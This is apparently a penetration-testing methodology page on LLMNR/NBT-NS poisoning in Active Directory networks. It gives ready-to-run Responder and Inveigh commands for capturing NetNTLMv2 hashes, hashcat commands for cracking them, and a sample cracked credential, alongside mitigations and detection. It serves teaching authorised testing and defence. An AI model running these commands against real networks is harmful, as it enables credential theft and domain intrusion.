---
title: "LLMNR & NBT-NS Poisoning"
description: "Capturing NetNTLMv2 hashes by spoofing Windows name-resolution fallback protocols, with Responder on Linux and Inveigh on Windows."
tags:
  - Active Directory
  - Poisoning
  - Responder
  - Inveigh
  - NTLM
---

# LLMNR & NBT-NS Poisoning

After external recon and initial domain enumeration you have a naming scheme, maybe a user list, but no credentials. Poisoning is one of the two parallel routes to a first foothold (the other is [password spraying](password-spraying.md)) — and it needs nothing more than a position on the local network segment.

## Why the attack exists

**LLMNR** (Link-Local Multicast Name Resolution, UDP/5355) and **NBT-NS** (NetBIOS Name Service, UDP/137) are Microsoft's fallback name-resolution protocols. When a Windows host asks DNS for a name and DNS fails — a typo, a decommissioned share, a mapped drive that no longer exists — the host doesn't give up. It broadcasts the question to the entire local segment: *"does anyone know where `fileserver01` is?"*

The flaw is that **any host on the network may answer**, and Windows trusts the first reply. An attacker running Responder or Inveigh answers every such broadcast with "that's me", and the victim — believing it found the right host — authenticates to it with NTLM.

```text
1. User (or an automated process) requests \\printer01\share, typo'd or stale
2. DNS: "host unknown"
3. Host broadcasts LLMNR/NBT-NS: "anyone know printer01?"
4. Attacker (Responder running): "yes, that's me!"
5. Host authenticates to the attacker with NTLM
6. Attacker captures a NetNTLMv2 hash
```

!!! note "This is not a vulnerability in one application"
    It's a property of the protocol and is present by default in nearly every Windows environment that hasn't explicitly disabled it. That's why this is usually the first thing tried on an internal engagement.

## What you actually capture

The victim doesn't send a password — it sends a **NetNTLMv2** challenge-response. That value:

- **Cannot be used for pass-the-hash.** It must be cracked offline to recover the cleartext password.
- **Can be relayed** instead of cracked, if the victim (or another host) has SMB signing disabled — covered separately as SMB Relay.
- Is tied to the responding host and the requesting user, so each capture is `(username, domain, challenge, hash)`.

## Attacking from Linux — Responder

Responder is the standard Linux tool. It is Python, pre-installed on most pentest distros, and poisons far more than just LLMNR/NBT-NS.

**Protocols it can poison or spoof:** LLMNR, NBT-NS, MDNS, DNS, DHCP, ICMP, HTTP/HTTPS, SMB, LDAP, WebDAV, Proxy Auth, MSSQL, DCE-RPC, FTP, POP3, IMAP, SMTP.

### Required ports

Responder needs these free on the attack host before it starts — stop any local `smbd`, `httpd`, etc. first:

```text
UDP: 137, 138, 53, 1434, 5355, 5353
TCP: 80, 135, 139, 445, 21, 25, 110, 587, 1433, 3128, 3141
UDP/TCP: 389
```

### Key flags

| Flag | Purpose |
| :--- | :--- |
| `-I <iface>` | Interface to listen/poison on (required) |
| `-A` | **Analyze mode** — passive; see requests without poisoning anything |
| `-w` | Start the **WPAD** rogue proxy — captures HTTP auth from browsers with "auto-detect proxy" enabled |
| `-f` | Fingerprint the OS of the requesting host |
| `-v` | Verbose |
| `-F` / `-P` | Force NTLM/proxy auth on WPAD retrieval — noisy, can pop login prompts; use sparingly |
| `--lm` | Force an LM downgrade for pre-Vista hosts |

```bash
# Passive first — confirm the protocols are actually in use before poisoning
sudo responder -I eth0 -A

# Active poisoning, with the common wf combo (WPAD + fingerprinting)
sudo responder -I eth0 -wf
```

Run it in `tmux` and leave it going while you do other enumeration — hashes trickle in as users touch broken shares, print to the wrong queue, or open a file that references a dead host:

```bash
tmux new -s responder
sudo responder -I eth0
# Ctrl+B, D to detach; tmux attach -t responder to come back
```

### Where the hashes land

```bash
ls /usr/share/responder/logs/
# SMB-NTLMv2-SSP-172.16.5.200.txt
# HTTP-NTLMv2-172.16.5.25.txt
# Responder-Session.log
```

File naming is `MODULE-HASHTYPE-CLIENT_IP.txt`; everything is also written to a SQLite DB (path configurable in `Responder.conf`), and each hash prints to the console as it's captured.

### Cracking the capture

```bash
# NetNTLMv2
hashcat -m 5600 SMB-NTLMv2-SSP-<TARGET_IP>.txt /usr/share/wordlists/rockyou.txt

# with rules for better coverage of corporate password patterns
hashcat -m 5600 SMB-NTLMv2-SSP-<TARGET_IP>.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

| Hash type | Hashcat mode |
| :--- | :--- |
| NetNTLMv2 | **5600** |
| NetNTLMv1 | 5500 |

A cracked result looks like:

```text
FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa...:Klmcargo2
```

That `Klmcargo2` is a cleartext domain password — your foothold. Feed it straight into [credentialed enumeration](credentialed-enumeration.md).

!!! warning "NTLMv2 cracking is slow"
    Even on a GPU rig, a long or genuinely random password may never fall offline. Collect broadly, but don't burn unlimited time cracking a hash for an account that won't advance the engagement — prioritise users BloodHound later shows as privileged.

## Attacking from Windows — Inveigh

Inveigh is Responder's functional equivalent for a Windows attack host: a managed VM, a foothold where you're local admin, or an engagement that restricts tooling to native/compiled Windows binaries. Same objective — capture LLMNR/NBT-NS/mDNS broadcasts and return NetNTLM hashes.

Two implementations exist:

| Version | Notes |
| :--- | :--- |
| `Inveigh.ps1` (PowerShell) | Original, no longer actively maintained; useful where script execution is still permitted |
| `Inveigh.exe` / **InveighZero** (C#) | Actively maintained; adds native IPv4/IPv6 sniffing |

```powershell
# PowerShell — load and inspect options
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters

# PowerShell — start LLMNR + NBNS spoofing with console and file output
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# — defaults already enable DNS, LLMNR, HTTP, WebDAV, LDAP, SMB
.\Inveigh.exe
```

Press `ESC` while `Inveigh.exe` is running to drop into its interactive console:

| Command | Effect |
| :--- | :--- |
| `GET NTLMV2` / `GET NTLMV2UNIQUE` | Show all captured hashes / one per unique user |
| `GET NTLMV2USERNAMES` | Usernames, source IPs, hostnames for each capture |
| `GET CLEARTEXT` / `GET CLEARTEXTUNIQUE` | Any cleartext creds captured (e.g. via WPAD/HTTP basic) |
| `GET LOG` | Search the running log |
| `RESUME` | Back to live console output |
| `STOP` | Shut it down |

Output files land in the directory passed at startup (default `C:\Tools`).

```powershell
# Stop the PowerShell version
Stop-Inveigh
```

!!! warning "Port conflicts"
    Inveigh's HTTP listener will fail to start if port 80 is already bound — common on hosts running IIS. Check with `netstat -ano` before launching.

## Mitigations and detection

This is MITRE ATT&CK **T1557.001** (AitM: LLMNR/NBT-NS Poisoning and SMB Relay).

**Fixing it:**

- Disable LLMNR: *Computer Configuration → Administrative Templates → Network → DNS Client → "Turn off Multicast Name Resolution"*
- Disable NBT-NS via a GPO-deployed registry change (per-interface, needs a reboot or adapter restart):

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | ForEach-Object {
    Set-ItemProperty -Path "$regkey\$($_.PSChildName)" -Name NetbiosOptions -Value 2 -Verbose
}
```

- Enable SMB signing everywhere, to block the relay path even if poisoning succeeds.
- Network-level filtering of UDP 5355/137, and segmentation for hosts that genuinely need these legacy protocols.

!!! note "Test before a full rollout"
    Disabling LLMNR/NBT-NS can break legacy applications that rely on them for name resolution. Recommend piloting on a subset of hosts first.

**Detecting it:** inject LLMNR/NBT-NS queries for hosts that don't exist and alert on any reply (a real DC will never answer for a non-existent name); monitor UDP 5355/137 traffic directly; and watch Event IDs 4697/7045 (service installs) and the `EnableMulticast` registry value under `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`.

!!! danger "Scope check"
    Poisoning produces visible, active network traffic — it is not passive. Confirm the engagement scope explicitly authorises active poisoning before you start Responder or Inveigh against `<DOMAIN>`.

## Next

A cracked or relayed credential moves you straight into [credentialed enumeration](credentialed-enumeration.md). If poisoning doesn't produce anything quickly, run it in the background and work [password spraying](password-spraying.md) in parallel — the two techniques are not mutually exclusive.
